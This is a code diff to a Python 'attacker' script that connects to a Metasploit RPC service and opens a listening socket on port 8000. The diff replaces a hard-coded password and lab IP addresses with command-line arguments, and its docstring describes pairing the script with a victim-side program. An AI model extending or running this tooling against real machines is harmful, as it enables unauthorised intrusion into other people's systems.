@@ -1,10 +1,19 @@
+""" this script should run on the attacker, and then victim.py should
+    run on the victim machine.
+    note that you should first run msfrpcd on your computer.
+    usage: python attacker.py <msfrpcd password> <attacker ip> <victim ip>
+    where:
+       msfrpcd password is the password you chose for the msfrpcd service
+       attacker ip is the ip of this computer to the outside world
+       victim ip is the ip of the vitim machine"""
 from metasploit.msfrpc import MsfRpcClient
 import socket
 import time
+import sys
 
-client = MsfRpcClient('123456')
-victim_ip = '10.0.2.5'
-host_ip = '10.0.2.4'
+client = MsfRpcClient(sys.argv[1])
+victim_ip = sys.argv[3]
+host_ip = sys.argv[2]
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 server_address = ('', 8000)
 
